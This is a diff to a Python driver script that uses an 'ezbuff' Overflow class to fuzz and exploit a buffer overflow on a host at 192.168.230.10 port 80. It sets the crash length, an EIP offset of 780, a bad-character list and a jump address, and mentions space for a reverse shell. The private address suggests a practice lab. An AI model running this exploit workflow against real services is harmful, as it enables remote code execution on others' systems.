@@ -6,52 +6,51 @@ from ezbuff.src.overflow import Overflow
 
 def main():
 	# Instanstantiate `Overflow` object
-	test = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
-	# print(repr(test), "\n")
-	# print(test)
+	obj = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
+	# print(repr(obj), "\n")
+	# print(obj)
 
 	# Change the target IP if running in interactive Python interpreter
-	# test.targ_ip = "127.0.0.1"
+	# obj.targ_ip = "127.0.0.1"
 
-	# Change the target port number if running tests in interactive Python interpreter
-	# test.targ_port = 443
+	# Change the target port number if running objs in interactive Python interpreter
+	# obj.targ_port = 443
 
 	# The number of seconds to wait in between the fuzzing process,
 	# default = 10
-	# test.fuzz_interval_seconds = 2
-
-	# Add bad characters to objects list containing bad characters found
-	# after sending characters payload.
-	# test.add_bad_char('\x00', '\x01', '\x02')
+	# obj.fuzz_interval_seconds = 2
 
 	# Set the increment of the fuzzer to be 150 as opposed to
 	# the default of 100
-	# test.fuzz_increment = 150
+	# obj.fuzz_increment = 150
 
 	# Fuzz the vulnerable application
-	# test.fuzz()
+	# obj.fuzz()
 
 	# Sets the number of bytes to crash the application.
 	# Make sure to accomodate space for reverse shell!!
-	test.num_bytes_crash = 1000
-
-	# Sending pattern to determine offset
-	# test.send_pattern()
-
-	# Get offset 
-	# test.get_offset("30416B30")
-
-	# print(test.offset)
+	obj.num_bytes_crash = 1200
 
 	# Set the offset after running the functions to find offset value
-	test.offset = 780
+	obj.offset = 780
 
-	# Test offset found by `get_offset` function
-	test.test_offset()
+	# Add bad characters to objects list containing bad characters found
+	# after sending characters payload.
+	# obj.add_bad_char("\x00", "\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")
+
+	# Send payload with characters to find bad characters.
+	# obj.send_bad_chars()
+
+	# Sending pattern to determine offset
+	# obj.send_pattern()
+
+	# Get offset 
+	# obj.get_offset("30416B30")
 
 	# Set the memory address to jump to after finding valid memory address
 	# containing `jump` instructions set in x86 architecture
-	# test.jump_eip = "\x8f\x35\x4a\x5f"
+	obj.jump_eip = "\x83\x0c\x09\x10"
+	obj.test("eip_address")
 
 
 if __name__ == '__main__':
